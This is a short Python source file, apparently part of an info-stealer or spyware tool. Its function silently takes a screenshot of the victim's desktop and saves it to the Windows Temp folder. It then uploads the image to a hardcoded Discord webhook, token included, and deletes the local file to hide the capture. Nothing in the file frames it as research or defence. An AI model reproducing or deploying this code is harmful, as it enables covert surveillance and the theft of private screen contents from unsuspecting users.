import os.path, requests, os
from PIL import ImageGrab

def sikrinsat():
    user = os.path.expanduser("~")

    hook = "https://discord.com/api/webhooks/1093755454435377152/EKOp55VTcS9I7KR-PJl_y5xqY7II0nFQZhT2SdBOk_SbWkeFxV00G2hJPrMjNqjP2mQW"

    captura = ImageGrab.grab()
    captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

    file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
    r = requests.post(hook, files=file)
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
    except:
        pass
        
